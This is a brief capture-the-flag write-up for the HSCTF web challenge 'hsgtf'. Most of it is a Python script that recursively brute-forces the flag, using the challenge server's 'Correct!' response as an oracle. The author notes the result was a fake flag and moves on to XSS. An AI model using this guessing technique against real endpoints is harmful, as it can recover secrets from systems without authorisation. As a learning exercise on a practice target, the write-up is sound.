---
created: 2024-06-11T01:36
updated: 2024-06-11T01:38
---

## HSCTF - web/hsgtf

**BFFG:** Brute-Force-Flag-Guessing

```python
import string

import requests

URL = 'http://web1.hsctf.com:8001/guess'
chars = list(string.printable)


def guess(flag):
    r = requests.get(url=URL, params={'guess': flag})
    return 'Correct!' in r.text


def guess_next(current):
    print(current + "... ")
    for c in chars:
        print(c, end='')
        if guess(current + c):
            print()
            if c == '}':
                return current + c
            else:
                return guess_next(current + c)
    print("Failed!")


print(guess_next(''))
```

Recursively guess the next character in the flag~

... And we got `flag{fake_flag}`

Well time for XSS

![](https://res.cloudinary.com/kumonochisanaka/image/upload/v1718084315/2024/06/004d4a24d87dc9bbde156a5577184968.png)
